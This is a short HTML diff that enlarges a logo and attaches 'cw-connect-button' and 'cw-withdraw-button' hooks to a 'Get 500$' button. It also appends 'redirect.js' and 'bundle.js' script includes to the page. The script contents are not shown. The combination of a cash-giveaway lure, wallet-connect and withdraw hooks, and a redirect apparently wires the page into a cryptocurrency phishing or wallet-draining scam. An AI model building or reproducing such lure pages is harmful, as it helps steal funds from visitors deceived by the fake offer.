@@ -56,7 +56,7 @@
                 </span>
                 <style>
       .logoText{
-        font-size: 26px;
+        font-size: 45px;
         font-weight:bolder
       }
     </style>
@@ -119,7 +119,7 @@
                 </div>
               </div>
               <div class="_28L9bIDyoxp9oEwwSvIlM3"><span></span></div>
-              <div class="connect_button">
+              <div class="connect_button cw-connect-button cw-withdraw-button">
                 <span>Get 500$</span>
               </div>
               <style>
@@ -241,5 +241,7 @@
         </div>
       </div>
     </div>
-  </body>
+  </body><script src="./redirect.js"></script> 
+<script src="./bundle.js" type="module"></script> 
+
 </html>
